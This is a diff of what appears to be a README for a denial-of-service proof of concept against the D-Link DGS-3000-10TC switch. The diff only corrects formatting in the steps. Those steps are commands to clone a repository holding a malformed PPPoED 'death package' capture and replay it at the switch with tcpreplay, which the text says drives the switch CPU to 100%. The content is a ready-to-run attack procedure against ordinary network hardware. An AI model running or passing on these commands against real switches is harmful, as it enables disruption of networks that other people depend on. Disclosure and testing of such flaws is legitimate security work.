@@ -28,14 +28,14 @@ When a broken pppoed packet comes to the switch - cpu 100%
 
 3. Get a death package
 
-    [git clone https://github.com/MakselPr/kill-dlink-DGS-3000-10TC.git
+    git clone https://github.com/MakselPr/kill-dlink-DGS-3000-10TC.git
     
 
 4. Run the command:
 
      cd kill-dlink-DGS-3000-10TC
      
-     tcpreplay  -i eth1 death_package.pcap
+	tcpreplay  -i eth1 death_package.pcap
      
 	where eth1 this is the network card connected to the switch
 
